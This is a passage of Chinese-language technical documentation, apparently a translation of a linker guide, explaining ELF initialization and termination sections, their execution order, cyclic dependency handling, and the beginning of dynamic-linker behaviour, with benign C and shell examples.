Section[^6]</h3><p><strong><code>术语</code></strong>：<br><code>Link-Editor</code>：链接器<br>&emsp;&emsp;链接器ld(1)，连接(Concatenate)并解释(Interpret)来自一个或多个输入文件的数据。这些文件可以是可重定位目标文件(Relocatable Objects)、共享目标文件(Shared Objects)或静态库(Archive Libraries)。从这些输入文件创建一个输出文件。此文件可以是动态可执行文件(Dynamic Executable)、位置无关可执行文件(Position-Independent Executable)、可重定位目标文件(Relocatable Object)或共享目标文件(Shared Objects)。链接器(Link-Editor)通常作为编译环境的一部分被调用。</p><p><code>Runtime Linker</code>：运行时链接器/加载器<br>&emsp;&emsp;运行时链接器ld.so.1(1)，在运行时处理动态可执行文件(Dynamic Executable)、位置无关可执行文件(Position-Independent Executable)和共享目标文件(Shared Objects)，将可执行文件(Executable)和共享目标文件(Shared Objects)绑定在一起以创建可运行的进程。</p><p><code>Shared Objects</code>：共享目标文件/共享对象/共享库<br>&emsp;&emsp;共享目标文件(Shared Objects)是链接编辑(Link-Edit)阶段的一种输出形式。共享目标文件有时称为共享库(Shared Libraries)。共享目标文件对于创建强大、灵活的运行时环境很重要。 </p><p><code>Object Files</code>：目标文件/对象文件<br>&emsp;&emsp;链接器(Link-Editor)、运行时链接器(Runtime Linker)和相关工具处理符合可执行与可链接格式(Executable and Linkable Format，也称为ELF)的文件。</p><h4 id="5-8-1-初始化和终止节"><a href="#5-8-1-初始化和终止节" class="headerlink" title="5.8.1 初始化和终止节"></a>5.8.1 初始化和终止节</h4><p>&emsp;&emsp;动态目标文件(Dynamic Objects)可以提供用于运行时初始化(Runtime Initialization)和终止处理(Termination Processing)的代码。每次在进程中加载动态目标文件时，动态目标文件的初始化代码执行一次。每次从进程卸载动态目标文件或在进程终止时，动态目标文件的终止代码执行一次。这段代码可以封装在两种节类型中的一种，函数指针数组或单个代码块。每一种节类型的节都是由输入的可重定位目标文件(Relocatable Objects)中的类似节串联(Concatenation)得到的。</p><p>&emsp;&emsp;.preinit_array、.init_array和.fini_array节分别提供了运行时预初始化(Pre-Initialization)、初始化(Initialization)和终止(Termination)函数的指针数组。在创建动态目标文件(Dynamic Objects)时，链接器(Link-Editor)会相应地使用.dynamic节的DT_PREINIT_[ARRAY/ARRAYSZ]、DT_INIT_[ARRAY/ARRAYSZ]和DT_FINI_[ARRAY/ARRAYSZ]“标签对”来标识这些数组。这些标签标识相关联的节，以便运行时链接器(Runtime Linker)可以调用这些节。预初始化数组(Pre-Initialization Array)仅适用于可执行文件。</p><blockquote><p>注释：分配给这些数组的函数必须由正在构建的目标文件提供。</p></blockquote><p>&emsp;&emsp;.init和.fini节分别提供了运行时初始化(Initialization)和终止(Termination)代码块。编译器驱动程序(Compiler Drivers)通常会为.init和.fini节提供它们添加到输入文件列表(Input File List)开头和结尾的文件。这些编译器提供的文件具有将.init和.fini节中的代码从可重定位目标文件(Relocatable Objects)封装(Encapsulating)到单个函数中的作用。</p><p>&emsp;&emsp;这些函数分别由保留符号名称_init和_fini标识。在创建动态目标文件(Dynamic Objects)时，链接器(Link-Editor)会相应地使用.dynamic的DT_INIT和DT_FINI标签来标识这些符号。这些标签标识相关联的节，以便运行时链接器(Runtime Linker)可以调用它们。</p><p>&emsp;&emsp;链接器(Link-Editor)可以使用“-z initarray”和“-z finiarray”选项直接执行初始化(Initialization)和终止(Termination)函数的注册。例如，以下命令将foo()的地址放在.init_array数组的元素中，将bar()的地址放在.fini_array数组的元素中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$ cat main.c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    (<span class="keyword">void</span>) <span class="built_in">printf</span>(<span class="string">"initializing: foo()\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bar</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    (<span class="keyword">void</span>) <span class="built_in">printf</span>(<span class="string">"finalizing: bar()\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    (<span class="keyword">void</span>) <span class="built_in">printf</span>(<span class="string">"main()\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ cc -o main -z initarray=foo -z finiarray=bar main.c</span><br><span class="line">$ main</span><br><span class="line">initializing: foo()</span><br><span class="line">main()</span><br><span class="line">finalizing: bar()</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;可以使用汇编器(Assembler)直接创建初始化(Initialization)和终止(Termination)节。然而，大多数编译器提供特殊的原语(Special Primitives)来简化它们的声明。例如，可以使用以下“#pragma”定义重写前面的代码示例。这些定义导致对foo()的调用被放置在.init节，对bar()的调用被放置在.fini节。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ cat main.c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> init (foo)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> fini (bar)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    (<span class="keyword">void</span>) <span class="built_in">printf</span>(<span class="string">"initializing: foo()\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bar</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    (<span class="keyword">void</span>) <span class="built_in">printf</span>(<span class="string">"finalizing: bar()\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    (<span class="keyword">void</span>) <span class="built_in">printf</span>(<span class="string">"main()\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ cc -o main main.c</span><br><span class="line">$ main</span><br><span class="line">initializing: foo()</span><br><span class="line">main()</span><br><span class="line">finalizing: bar()</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;初始化(Initialization)和终止(Termination)代码分布(Spread Through)在多个可重定位目标文件(Relocatable Objects)中，当包含在静态库(Archive Library)或共享目标文件/动态库(Shared Object)中时，可能会导致不同的行为。使用静态库(Archive)的应用程序的链接编辑(Link-Edit)可能只提取静态库中包含的一小部分对象，这些对象可能仅提供分布在静态库成员中的一部分初始化和终止代码。在运行时，只执行这部分代码。当依赖项在运行时被加载时，基于共享目标文件/动态库(Shared Object)构建的同一应用程序将执行所有累积的(Accumulated)初始化和终止代码。</p><p>&emsp;&emsp;在运行时确定进程内执行初始化(Initialization)和终止(Termination)代码的顺序是一个涉及依赖性分析(Dependency Analysis)的复杂问题。限制初始化和终止代码的内容以简化此分析。简化的、自包含的、初始化和终止代码提供可预测的运行时行为。</p><p>&emsp;&emsp;如果初始化代码涉及动态目标文件(Dynamic Object)，其内存可以使用dldump(3C)转储，则数据初始化应该是独立的。</p><h4 id="5-8-2-初始化和终止例程"><a href="#5-8-2-初始化和终止例程" class="headerlink" title="5.8.2 初始化和终止例程"></a>5.8.2 初始化和终止例程</h4><p>&emsp;&emsp;在将控制转移到应用程序之前，运行时链接器(Runtime Linker)会处理应用程序中找到的任何初始化节(Initialization Sections)以及任何加载的依赖项(Loaded Dependencies)。如果在进程执行期间加载了新的动态目标文件(Dynamic Objects)，则它们的初始化节将作为加载对象的一部分进行处理。初始化节.preinit_array、.init_array和.init是在构建动态目标文件(Dynamic Objects)时由链接器(Link-Editor)创建的。</p><p>&emsp;&emsp;运行时链接器(Runtime Linker)执行地址包含在.preinit_array和.init_array节中的函数。这些函数的执行顺序与其地址在数组中的出现顺序相同。运行时链接器(Runtime Linker)将.init节作为单独的函数执行。如果一个对象同时包含.init和.init_array节，则.init节在执行该对象的.init_array节定义的函数之前被执行。</p><p>&emsp;&emsp;可执行文件可以在.preinit_array节中提供预初始化函数(Pre-Initialization Functions)。这些函数在运行时链接器(Runtime Linker)构建进程映像并执行重定位之后，但在任何其他初始化函数(Initialization Functions)执行之前执行。共享目标文件/动态库(Shared Objects)中不允许使用预初始化函数(Pre-Initialization Functions)。</p><blockquote><p>注释：可执行文件中的任何.init节都是由编译器驱动程序(Compiler Driver)提供的进程启动机制(Process Startup Mechanism)从应用程序调用的。在执行所有依赖项初始化节(Dependency Initialization Sections)之后，最后调用可执行文件中的.init节。</p></blockquote><p>&emsp;&emsp;动态目标文件(Dynamic Objects)还可以提供终止节。终止节.fini_array和.fini是在构建动态目标文件(Dynamic Objects)时由链接器(Link-Editor)创建的。</p><p>&emsp;&emsp;任何终止节都将传递给atexit(3C)。当进程调用exit(2)时会调用这些终止例程。当使用dlclose(3C)从正在运行的进程中删除对象时，也会调用终止节。</p><p>&emsp;&emsp;运行时链接器(Runtime Linker)执行地址包含在.fini_array节中的函数。这些函数的执行顺序与它们的地址在数组中出现的顺序相反。运行时链接器(Runtime Linker)将.fini节作为单独的函数执行。如果一个对象同时包含.fini和.fini_array节，则.fini_array节定义的函数在该对象的.fini节执行之前被执行。</p><blockquote><p>注释：可执行文件中的任何.fini节都是由编译器驱动程序(Compiler Driver)提供的进程终止机制(Process Termination Mechanism)从应用程序调用的。在执行所有依赖项终止节(Dependency Termination Sections)之前，首先调用可执行文件的.fini节。</p></blockquote><h5 id="5-8-2-1-初始化和终止代码的限制和陷阱"><a href="#5-8-2-1-初始化和终止代码的限制和陷阱" class="headerlink" title="5.8.2.1 初始化和终止代码的限制和陷阱"></a>5.8.2.1 初始化和终止代码的限制和陷阱</h5><p>&emsp;&emsp;ELF初始化、终止节和例程(Routines)在对象生命周期(Life Cycle)的敏感点(Sensitive Point)执行。在初始化(Initialization)期间，对象已加载到内存中，但尚未完全初始化。在终止(Finalization)期间，对象仍然加载在内存中，但使用不再安全，并且可能会部分地(Partially)从进程状态(Process State)中移除。在任何一种情况下，进程状态都不是完全一致的，并且对于代码可以安全执行的操作有很大的限制。常见的陷阱(Pitfalls)包括但不限于以下内容：</p><ul><li>循环依赖(Cyclic Dependencies)导致死锁(Deadlock)，其中一个对象的初始化代码会触发另一个对象的加载，而另一个对象又调用回初始对象。</li><li>在多线程应用程序中使用共享目标文件/动态库(Shared Object)时线程序列化(Serialization)失败。两个线程可能会尝试同时访问延迟加载的库(Lazily Loaded Library)。首先到达那里的线程将导致运行时链接器(Runtime Linker)加载对象并开始运行初始化代码。程序员经常错误地认为，运行时链接器(Runtime Linker)可以在ELF初始化和终止代码运行时阻止多个线程同时访问给定对象，但事实并非如此。一旦初始化代码正在运行，运行时链接器(Runtime Linker)就无法阻止其他线程尝试访问该库。因此，第二个线程可能以不一致(Inconsistent)的状态访问对象。对象有责任通过提供必要的锁(Locks)或要求调用者这样做来序列化此类访问。</li></ul><p>&emsp;&emsp;ELF初始化、终止节和例程(Routines)允许执行任意代码，给人的错觉(Illusion)是它们能够执行在正常上下文(Normal Context)中运行的代码可能执行的任何操作。从这个角度来看，这样的代码似乎只是一种无需显式函数调用(Explicit Function Calls)即可进行初始化或清理的便捷方式(Convenient Way)。这种误解(Misconception)会导致难以诊断(Diagnose)的故障。</p><p>&emsp;&emsp;程序员在使用ELF初始化和终止代码时应谨慎(Cautious)，并限制操作的范围(Scope)和复杂性(Complexity)。链接器(Link-Editor)和运行时链接器(Runtime Linker)无法识别此类代码的内容或用途，也无法诊断(Diagnose)或预防(Prevent)不安全代码。小型自包含(Self Contained)操作是安全的。涉及访问其他对象或进程状态的操作可能不会。库不应该在初始化和终止代码中尝试复杂的操作，而应该为它们的调用者提供显式的(Explicit)初始化和终止函数，并记录这样做的需求。</p><h5 id="5-8-2-2-初始化和终止顺序"><a href="#5-8-2-2-初始化和终止顺序" class="headerlink" title="5.8.2.2 初始化和终止顺序"></a>5.8.2.2 初始化和终止顺序</h5><p>&emsp;&emsp;在运行时确定进程内执行初始化(Initialization)和终止(Termination)代码的顺序是一个涉及依赖性分析(Dependency Analysis)的复杂过程。这个过程从初始化和终止节的最初的实现(Original Inception)有了很大的发展。此过程试图满足现代语言和当前编程技术的期望(Expectations)。但是，可能存在难以满足用户期望的场景。通过理解这些场景并限制初始化代码和终止代码的内容，可以实现灵活的、可预测的运行时行为。</p><p>&emsp;&emsp;初始化节(Initialization Section)的目标是在引用同一对象中的任何其他代码之前执行一小段代码。终止节(Termination Section)的目标是在对象执行完毕后执行一小段代码。自包含(Self Contained)的初始化节和终止节可以轻松满足这些要求。</p><p>&emsp;&emsp;但是，初始化节(Initialization Section)通常更复杂，并且会引用其他对象提供的外部接口。因此，在从其他对象引用之前，必须先执行一个对象的初始化节，这样就建立了依赖关系(Dependency)。应用程序可以建立广泛的依赖层次结构(Dependency Hierarchy)。此外，依赖关系可以在其层次结构中创建循环。如果初始化节加载额外的对象，或者改变已经加载的对象的重定位模式，情况可能会变得更加复杂(Complicated)。这些问题导致了各种试图满足这些节的原始目标的排序(Sorting)和执行(Execution)技术。</p><p>&emsp;&emsp;运行时链接器(Runtime Linker)构造一个已加载对象的拓扑排序列表(Topologically Sorted List)。此列表是根据每个对象表示的依赖关系(Dependency Relationship)以及所表示依赖关系之外的任何符号绑定(Symbol Bindings)构建的。</p><p>&emsp;&emsp;初始化节以依赖项的反向拓扑顺序(Reverse Topological Order)执行。如果发现了循环依赖关系(Cyclic Dependencies)，则不能对构成循环的对象进行拓扑排序(Topologically Sorted)。任何循环依赖项的初始化节都以其反向的加载顺序(Reverse Load Order)执行的。类似地，终止节按依赖关系的拓扑顺序调用。任何循环依赖项的终止节都按其加载顺序执行。</p><p>&emsp;&emsp;通过使用带有-i选项的ldd(1)命令可以获得对对象依赖项的初始化顺序的静态分析。例如，下面的动态目标文件(Dynamic Objects)显示了一个循环依赖关系。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$ elfdump -d B.so.1 | grep NEEDED</span><br><span class="line">    [1] NEEDED 0xa9 C.so.1</span><br><span class="line">$ elfdump -d C.so.1 | grep NEEDED</span><br><span class="line">    [1] NEEDED 0xc4 B.so.1</span><br><span class="line">$ elfdump -d main | grep NEEDED</span><br><span class="line">    [1] NEEDED 0xd6 A.so.1</span><br><span class="line">    [2] NEEDED 0xc8 B.so.1</span><br><span class="line">    [3] NEEDED 0xe4 libc.so.1</span><br><span class="line"></span><br><span class="line">$ ldd -i main</span><br><span class="line">        A.so.1 =&gt; ./A.so.1</span><br><span class="line">        B.so.1 =&gt; ./B.so.1</span><br><span class="line">        libc.so.1 =&gt; /lib/libc.so.1</span><br><span class="line">        C.so.1 =&gt; ./C.so.1</span><br><span class="line">        libm.so.2 =&gt; /lib/libm.so.2</span><br><span class="line">    cyclic dependencies detected, group[1]:</span><br><span class="line">        ./libC.so.1</span><br><span class="line">        ./libB.so.1</span><br><span class="line">    init object=/lib/libc.so.1</span><br><span class="line">    init object=./A.so.1</span><br><span class="line">    init object=./C.so.1 - cyclic group [1], referenced by:</span><br><span class="line">        ./B.so.1</span><br><span class="line">    init object=./B.so.1 - cyclic group [1], referenced by:</span><br><span class="line">        ./C.so.1</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;前面的分析完全来自显式依赖关系(Explicit Dependency Relationships)的拓扑排序(Topological Sorting)。但是，经常会创建未定义其所需依赖项(Required Dependencies)的对象。出于这个原因，符号绑定(Symbol Bindings)也被纳入为依赖分析的一部分。符号绑定与显式依赖的结合有助于产生更准确(Accurate)的依赖关系。通过使用带有-i和-d选项的ldd(1)命令可以获得更准确的初始化顺序的静态分析。</p><p>&emsp;&emsp;加载对象的最常见模型是使用延迟绑定(Lazy Binding)。使用此模型，在初始化处理之前仅处理直接引用(Immediate Reference)符号绑定。来自延迟引用(Lazy References)的符号绑定可能仍处于挂起状态(Pending)。这些绑定可以扩展迄今为止建立的依赖关系。通过使用带有-i和-r选项的ldd(1)命令可以获得包含所有符号绑定的初始化顺序的静态分析。实际上，大多数应用程序使用延迟绑定(Lazy Binding)。因此，在计算初始化顺序之前实现的依赖分析遵循使用“ldd -i -d”的静态分析。但是，由于这种依赖关系分析可能不完整(Incomplete)，而且可能存在循环依赖关系，所以运行时链接器(Runtime Linker)提供了动态初始化。</p><p>&emsp;&emsp;动态初始化(Dynamic Initialization)尝试在调用同一对象中的任何函数之前执行对象的初始化节(Initialization Section)。在延迟符号绑定(Lazy Symbol Binding)期间，运行时链接器(Runtime Linker)确定是否已调用绑定到的对象的初始化节(Initialization Section)。如果没有，运行时链接器(Runtime Linker)在从符号绑定过程(Symbol Binding Procedure)返回之前执行初始化节。</p><p>&emsp;&emsp;ldd(1)命令不能显示动态初始化(Dynamic Initialization)。但是，通过将LD_DEBUG环境变量设置为包含init令牌，可以在运行时观察到初始化调用的确切序列(Exact Sequence)。通过添加调试令牌细节，可以捕获大量运行时初始化信息和终止信息。此信息包括依赖项列表(Dependency Listings)、拓扑处理(Topological Processing)和循环依赖项(Cyclic Dependencies)的识别。</p><p>&emsp;&emsp;动态初始化(Dynamic Initialization)仅在处理延迟引用(Lazy References)时可用。这种动态初始化通过以下方式规避(Circumvented)：</p><ul><li>使用环境变量LD_BIND_NOW。</li><li>使用“-z now”选项构建的对象。</li><li>使用dlopen(3C)以RTLD_NOW模式加载的对象。</li></ul><p>&emsp;&emsp;到目前为止所描述的初始化技术可能仍然不足(Insufficient)以应对一些动态活动(Dynamic Activities)。初始化节可以加载其他对象，可以显式地使用dlopen(3C)，也可以隐式地通过延迟加载(Lazy Loading)和使用过滤器(Filters)。初始化节(Initialization Sections)还可以促进(Promote)现有对象的重定位。如果使用具有RTLD_NOW模式的dlopen(3C)引用同一对象，则已加载以使用延迟绑定(Lazy Binding)的对象将解析这些绑定。这种重定位提升有效地抑制了动态解析函数调用时可用的动态初始化功能。</p><p>&emsp;&emsp;每当加载新对象或提升(Promoted)现有对象的重定位时，就会启动这些对象的拓扑排序(Topological Sort)。实际上，在建立新的初始化要求并执行关联的初始化节时，暂停了原始初始化执行。该模型试图确保新引用的对象被适当地初始化以供原始初始化节使用。但是，这种并行化(Parallelization)可能会导致不必要的递归(Unwanted Recursion)。</p><p>&emsp;&emsp;在处理采用延迟绑定(Lazy Binding)的对象时，运行时链接器(Runtime Linker)可以检测某些级别的递归(Recursion)。这个递归可以通过设置LD_DEBUG=init来显示。例如，执行foo.so.1的初始化节可能会导致调用另一个对象。如果此对象随后引用foo.so.1中的接口，则创建一个循环。作为将延迟函数引用绑定到foo.so.1的一部分，运行时链接器(Runtime Linker)可以检测此递归(Recursion)。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ LD_DEBUG=init prog</span><br><span class="line">00905: ....</span><br><span class="line">00905: warning: calling foo.so.1 whose init has not completed</span><br><span class="line">00905: ....</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;运行时链接器(Runtime Linker)无法检测到通过已重定位的引用发生的递归(Recursion)。</p><p>&emsp;&emsp;递归可能是耗时(Expensive)且有问题的(Problematic)。减少可由初始化节触发的外部引用(External References)和动态加载活动(Dynamic Loading Activities)的数量，以消除递归。</p><p>&emsp;&emsp;对于使用dlopen(3C)添加到正在运行的进程中的任何对象，都会重复初始化处理。对于由于调用dlclose(3C)而从进程中卸载的任何对象，也会执行终止处理。</p><p>&emsp;&emsp;前面的部分描述了各种用于以满足用户期望的方式执行初始化和终止节的技术。但是，还应采用编码风格(Coding Style)和链接编辑实践(Link-Editing Practices)来简化依赖项之间的初始化和终止关系。这种简化有助于使初始化处理和终止处理可预测，同时不太容易受到意外依赖顺序(Unexpected Dependency Ordering)的任何副作用。</p><p>&emsp;&emsp;将初始化和终止节的内容保持在最低限度。通过在运行时初始化对象来避免全局构造函数(Global Constructors)。减少初始化和终止代码对其他依赖项的依赖。定义所有动态目标文件(Dynamic Objects)的依赖需求。不要表达非必需的依赖关系。避免循环依赖。不要依赖于初始化或终止序列的顺序。对象的排序会受到共享对象和应用程序开发的影响。</p><h4 id="5-8-3-preinit-array"><a href="#5-8-3-preinit-array" class="headerlink" title="5.8.3 .preinit_array"></a>5.8.3 .preinit_array</h4><p>&emsp;&emsp;此节包含一个函数指针数组，这些函数是在此可执行文件(Executable File)中所有其他初始化函数调用之前调用的函数。数组中的每个指针都被视为具有void返回值的无参数函数。.preinit_array节是在构建动态目标文件(Dynamic Objects)时由链接器(Link-Editor)创建的。.dynamic节中的DT<em>PREINIT</em>[ARRAY/ARRAYSZ]“标签对”来标识这个节。此节属于SHT_PREINIT_ARRAY类型。使用的属性是SHF_ALLOC和SHF_WRITE。</p><p>&emsp;&emsp;可执行文件可以在.preinit_array节中提供预初始化函数(Pre-Initialization Functions)。这些函数在运行时链接器(Runtime Linker)构建进程映像并执行重定位之后，但在任何其他初始化函数(Initialization Functions)执行之前执行。共享目标文件/动态库(Shared Objects)中不允许使用预初始化函数(Pre-Initialization Functions)。</p><h4 id="5-8-4-init"><a href="#5-8-4-init" class="headerlink" title="5.8.4 .init"></a>5.8.4 .init</h4><p>&emsp;&emsp;此节为包含该节的动态目标文件(Dynamic Object)保存帮助进程初始化的单个初始化函数的可执行指令。当程序开始运行时，系统会在调用主程序入口点(在C程序中称为main)之前执行本节中的代码。.init节是在构建动态目标文件(Dynamic Objects)时由链接器(Link-Editor)创建的。.dynamic节中的DT_INIT“标签”来标识这个节。此节属于SHT_PROGBITS类型。使用的属性是SHF_ALLOC和SHF_EXECINSTR。如果一个对象同时包含.init和.init_array节，则.init节在执行该对象的.init_array节定义的函数之前被执行。</p><h4 id="5-8-5-init-array"><a href="#5-8-5-init-array" class="headerlink" title="5.8.5 .init_array"></a>5.8.5 .init_array</h4><p>&emsp;&emsp;此节包含一个函数指针数组，用于为包含该节的动态目标文件(Dynamic Object)提供初始化函数的指针数组。.init_array节是在构建动态目标文件(Dynamic Objects)时由链接器(Link-Editor)创建的。.dynamic节中的DT<em>INIT</em>[ARRAY/ARRAYSZ]“标签对”来标识这个节。此节属于SHT_INIT_ARRAY类型。使用的属性是SHF_ALLOC和SHF_WRITE。如果一个对象同时包含.init和.init_array节，则.init节在执行该对象的.init_array节定义的函数之前被执行。</p><h4 id="5-8-6-text"><a href="#5-8-6-text" class="headerlink" title="5.8.6 .text"></a>5.8.6 .text</h4><p>&emsp;&emsp;此节保存程序的“文本(text)”或可执行指令。此节属于SHT_PROGBITS类型。使用的属性是SHF_ALLOC和SHF_EXECINSTR。</p><h4 id="5-8-7-fini-array"><a href="#5-8-7-fini-array" class="headerlink" title="5.8.7 .fini_array"></a>5.8.7 .fini_array</h4><p>&emsp;&emsp;此节包含一个函数指针数组，用于为包含该节的动态目标文件(Dynamic Object)提供终止函数的指针数组。.fini_array节是在构建动态目标文件(Dynamic Objects)时由链接器(Link-Editor)创建的。.dynamic节中的DT<em>FINI</em>[ARRAY/ARRAYSZ]“标签对”来标识这个节。此节属于SHT_FINI_ARRAY类型。使用的属性是SHF_ALLOC和SHF_WRITE。如果一个对象同时包含.fini和.fini_array节，则.fini_array节定义的函数在该对象的.fini节执行之前被执行。</p><h4 id="5-8-3-fini"><a href="#5-8-3-fini" class="headerlink" title="5.8.3 .fini"></a>5.8.3 .fini</h4><p>&emsp;&emsp;此节为包含该节的动态目标文件(Dynamic Object)保存帮助进程终止的单个终止函数的可执行指令。当程序正常退出时，系统执行本节中的代码。.fini节是在构建动态目标文件(Dynamic Objects)时由链接器(Link-Editor)创建的。.dynamic节中的DT_FINI“标签”来标识这个节。此节属于SHT_PROGBITS类型。使用的属性是SHF_ALLOC和SHF_EXECINSTR。如果一个对象同时包含.fini和.fini_array节，则.fini_array节定义的函数在该对象的.fini节执行之前被执行。</p><h3 id="5-9-Dynamic-Related-Sections"><a href="#5-9-Dynamic-Related-Sections" class="headerlink" title="5.9 Dynamic Related Sections"></a>5.9 Dynamic Related Sections</h3><h4 id="动态链接器"><a href="#动态链接器" class="headerlink" title="动态链接器"></a>动态链接器</h4><p>&emsp;&emsp;在构建使用动态链接(Dynamic Linking)的可执行文件时，链接器(Link Editor)会在可执行文件中添加类型为PT_INTERP的程序头元素，告诉系统调用动态链接器(Dynamic Linker)作为程序解释器(Program Interpreter)。</p><blockquote><p>注释：系统提供的动态链接器的位置是特定于处理器的。</p></blockquote><p>可执行文件(Executable File)和动态链接器(Dynamic Linker)合作为程序创建进程映像，这需要以下操作：</p><ul><li>将可执行文件的内存段(Memory Segments)添加到进程映像(Process Image)中；</li><li>向进程映像(Process Image)添加共享目标文件内存段(Shared Object Memory Segments)；</li><li>对可执行文件及其共享目标文件执行重定位；</li><li>关闭用于读取可执行文件的文件描述符(File Descriptor)，如果已提供给动态链接器；</li><li>将控制权转移给程序，使程序看起来好像是直接从可执行文件中获得控制权的。</li></ul><p>&emsp;&emsp;链接器(Link Editor)还为可执行文件(Executable Files)和共享目标文件(Shared Object Files)构建各种数据来帮助动态链接器(Dynamic Linker)。如上面“程序头(Program Header)”中所示，这些数据驻留在可加载段(Loadable Segments)中，使它们在执行期间可用。(请注意，确切的段内容是特定于处理器的。)</p><ul><li>节类型为SHT_DYNAMIC的.dynamic节保存各种数据。位于该节开头的结构保存其他动态链接信息的地址。</li><li>节类型为SHT_HASH的.hash节包含一个符号哈希表(Symbol Hash Table)。节类型为SHT_GNU_HASH的.gnu.hash节包含一个GNU风格的符号哈希表。</li><li>节类型为SHT_PROGBITS的.got和.plt节包含两个单独的表：全局偏移表(Global Offset Table)和过程链接表(Procedure Linkage Table)。程序对位置无关(Position-Independent)的代码使用全局偏移表。下面的部分解释了动态链接器(Dynamic Linker)如何使用和更改表来为目标文件创建内存映像(Memory Images)。</li></ul><p>&emsp;&emsp;因为每个符合UNIX System V的程序都从共享目标库(Shared Object Library)中导入基本系统服务(Basic System Services)，所以动态链接器参与每个符合TIS ELF的程序执行。</p><p>&emsp;&emsp;共享目标文件(Shared Objects)可能占用与文件程序头表(Program Header Table)中记录的地址不同的虚拟内存地址。动态链接器(Dynamic Linker)重定位内存映像(Memory Image)，在应用程序获得控制之前更新绝对地址(Absolute Addresses)。如果库是在程序头表(Program Header Table)中指定的地址处加载的，那么绝对地址值是正确的，但通常情况并非如此。</p><p>&emsp;&emsp;如果进程环境包含一个名为LD_BIND_NOW且具有非空值(non-null)的变量，则动态链接器(Dynamic Linker)会在将控制权转移到程序之前处理所有重定位。例如，以下所有环境条目都将指定此行为：</p><ul><li>LD_BIND_NOW=1</li><li>LD_BIND_NOW=on</li><li>LD_BIND_NOW=off</li></ul><p>&emsp;&emsp;否则，LD_BIND_NOW要么不会出现在环境中，要么具有空值。动态链接器(Dynamic Linker)被允许延迟地计算过程链接表(Procedure Linkage Table)条目，从而避免符号解析(Symbol Resolution)和未调用函数的重定位开销。</p><h4 id="共享目标文件依赖"><a href="#共享目标文件依赖" class="headerlink" title="共享目标文件依赖"></a>共享目标文件依赖</h4><p>&emsp;&emsp;当链接器(Link Editor)处理静态库(Archive Library)时，它提取库成员并将它们复制到输出目标文件中。这些静态链接的服务在执行期间可用，而无需涉及到动态链接器(Dynamic Linker)。共享目标文件(Shared Objects)也提供服务，动态链接器必须将适当的共享目标文件附加到进程映像(Process Image)以供执行。因此，可执行文件和共享目标文件描述了它们特定的依赖关系。</p><p>&emsp;&emsp;当动态链接器为目标文件创建内存段(Memory Segments)时，依赖关系(记录在.dynamic节的DT_NEEDED条目中)告诉动态链接器需要哪些共享目标文件来提供程序服务。通过重复连接(Repeatedly 